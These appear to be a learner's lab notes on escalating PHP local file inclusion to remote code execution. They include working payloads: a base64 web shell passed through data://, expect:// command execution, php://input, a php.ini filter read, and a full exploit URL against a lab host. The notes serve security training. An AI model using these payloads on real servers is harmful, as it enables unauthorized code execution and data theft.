
## 1. Goal of This Section

So far, LFI was used for **file disclosure**.  
Now the objective changes:

> **Execute code on the server → Remote Code Execution (RCE)**

This is done using **PHP wrappers**, depending on:

- PHP configuration
- Vulnerable function behavior
- Allowed URL inclusion

---

## 2. PHP Wrappers (What They Are)

**PHP wrappers** allow PHP to treat different data sources as files.

Examples:

- Files
- Memory
- HTTP streams
- Raw input
- Encoded data

Wrappers are accessed using:

`php://`

Some wrappers **read data**, others **execute code**.

---

## 3. Critical PHP Setting: `allow_url_include`

Most RCE wrappers **require** this setting.

### What it does

Allows PHP to include data from URLs / streams.

### How to check it (via LFI)

Read `php.ini` using base64 filter:

`php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini`

Decode and grep:

`base64 -d | grep allow_url_include`

### Required value

`allow_url_include = On`

If **OFF** → many wrappers will **not work**.

![[Pasted image 20251219212910.png]]
![[Pasted image 20251219213003.png]]


### Requirement for Expect

- `expect` extension must be installed and enabled

Check via php.ini:

`grep expect`

Expected:

`extension=expect`
![[Pasted image 20251219213129.png]]


---

## 4. `data://` Wrapper (Most Reliable)

### Purpose

- Include external data
- Execute PHP code
- Supports Base64 payloads

### Why it’s powerful

- No file upload needed
- Payload is inline
- Clean execution

---

### Step 1: Create PHP Web Shell

![[Pasted image 20251219180655.png]]

Example output:

`PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==`

---

### Step 2: Execute via LFI

`/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id`

Result:

`uid=33(www-data) gid=33(www-data)`

✔ RCE achieved

![[Pasted image 20251219205138.png]]
![[Pasted image 20251219210738.png]]

```url
http://94.237.120.233:58718/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==&cmd=cd .. ; cd .. ; cd .. ; cd .. ; cat 37809e2f8952f06139011994726d9ef1.txt
```

---

## 5. `php://input` Wrapper

### Purpose

- Execute PHP code sent in POST body

### Requirements

- `allow_url_include = On`
- Vulnerable parameter must accept **POST**

![[Pasted image 20251219180730.png]]
(Pasted image because SAP thinks its a thread and deletes it)

✔ Executes command

![[Pasted image 20251219211445.png]]

---

### When to use

- When GET-based payloads are filtered
- When POST is allowed but file uploads aren’t

---

## 6. `expect://` Wrapper (Direct Command Execution)

### Purpose

- Execute OS commands directly
- No PHP shell needed

### Requirement

- `expect` extension must be installed and enabled

Check via php.ini:

`grep expect`

Expected:

`extension=expect`

---

### Exploitation

`/index.php?language=expect://id`

Output:

`uid=33(www-data)`

✔ Cleanest RCE if available  
❌ Rare in real-world targets

---

## 7. Wrapper Comparison (Reality Check)

| Wrapper     | Needs allow_url_include | Needs POST | Needs Extension | Reliability |
| ----------- | ----------------------- | ---------- | --------------- | ----------- |
| data://     | Yes                     | No         | No              | ⭐⭐⭐⭐        |
| php://input | Yes                     | Yes        | No              | ⭐⭐⭐         |
| expect://   | No                      | No         | Yes             | ⭐⭐          |

---

## 8. Why This Works (Important)

LFI functions like `include()`:

- **Execute PHP**
- Don’t care where code came from
- Trust wrappers blindly

So if input becomes executable PHP → **game over**

---

## 9. Common Mistakes (Don’t Be That Guy)

- Forgetting to check `allow_url_include`
- Using browser instead of curl (output truncation)
- URL-encoding mistakes in Base64
- Assuming 403/302 blocks inclusion (they don’t)


---

## 10. One-Line Payloads (Cheat Sheet)

![[Pasted image 20251219180848.png]]

## 11. Final Takeaway

- **PHP Filters → Read source**
- **PHP Wrappers → Execute code**
- LFI + wrapper = **RCE**
- Configuration matters more than payloads